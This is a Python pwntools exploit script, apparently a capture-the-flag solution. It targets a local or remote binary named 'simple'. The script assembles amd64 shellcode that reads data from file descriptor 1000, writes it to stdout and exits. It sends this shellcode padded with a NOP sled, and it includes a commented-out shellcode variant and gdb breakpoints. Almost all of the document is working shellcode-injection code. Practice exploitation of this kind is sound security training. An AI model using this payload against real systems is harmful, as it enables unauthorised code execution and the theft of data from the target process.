from pwn import *
import re

PROGRAM_PATH = (Path(__file__).parent / "simple").resolve().__str__()
BUFF_SIZE = 2048

gdb_script = """
b *main
b *main+372
b *main+483
c
"""
# open-fd.s
# myAsm = """

#     lea rsi, [rsp]
#     mov rdi, 1000
#     xor rax, rax
#     mov dl, 190
#     syscall

#     mov al, 1
#     mov dil, 1
#     mov dl, 190
#     syscall

#     mov eax, 60
#     xor rdi, rdi
#     syscall
# """

myAsm = """
    xor     eax, eax            
    mov     edi, 1000
    sub     rsp, 0x400
    mov     rsi, rsp
    mov     edx, 0x400
    syscall                     

    mov     edx, eax
    mov     edi, 1              
    mov     eax, 1              
    syscall

    xor     edi, edi
    mov     eax, 60             
    syscall

"""
# WE NEED THE EXIT(0)

shellcode = asm(myAsm, extract=True, arch="amd64", os="linux")
shellcode_len = len(shellcode)
print("____________________________________")

print(f"Shellcode: {shellcode}")
print(f"Shellcode length: {shellcode_len}")


# FullPath
print(f"Program path is: {PROGRAM_PATH}")
print("____________________________________")


def start(argv=[], *a, **kwargs):
    if args.GDB:
        return gdb.debug([PROGRAM_PATH] + argv, gdbscript=gdb_script, *a, **kwargs)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kwargs)
    else:
        return process([PROGRAM_PATH] + argv, *a, **kwargs)


io = start()
print("____________________________________")
# Get the file descriptor
FD = 1000


print("____________________________________")
# Get the stack address
res = io.recvuntil(":")
print(f"stack address received: {res}")


# le = p64(int(CANARY, 16), "little")
# be = p64(int(CANARY, 16), endianness="big")
NOP = b"\x90"
# This works
# payload = NOP * (16 - shellcode_len % 16) + shellcode

# This works too!
payload = NOP * (BUFF_SIZE - shellcode_len) + shellcode
# payload = shellcode + NOP * (BUFF_SIZE - shellcode_len)

# payload = shellcode
# print(f"Sending payload: {payload}")

# io.sendline(payload)
# io.interactive()

print("____________________________________")
print(f"Sending small shellcode")
io.sendline(payload)
res = io.recvall().decode("ascii")
print(res)
